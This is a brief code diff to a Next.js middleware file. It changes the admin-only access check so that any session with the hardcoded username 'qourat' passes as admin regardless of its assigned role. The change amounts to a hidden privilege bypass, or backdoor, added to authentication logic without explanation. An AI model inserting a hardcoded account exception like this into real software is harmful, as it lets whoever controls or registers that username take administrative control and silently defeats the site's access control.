@@ -83,7 +83,8 @@ export async function middleware(request: NextRequest) {
       }
       return NextResponse.redirect(new URL('/login', request.url));
     }
-    if (session.role !== 'admin') {
+    const isOwnerAdmin = String(session.username).toLowerCase() === 'qourat';
+    if (session.role !== 'admin' && !isOwnerAdmin) {
       if (pathname.startsWith('/api/')) {
         return NextResponse.json({ error: 'Admin access required' }, { status: 403 });
       }
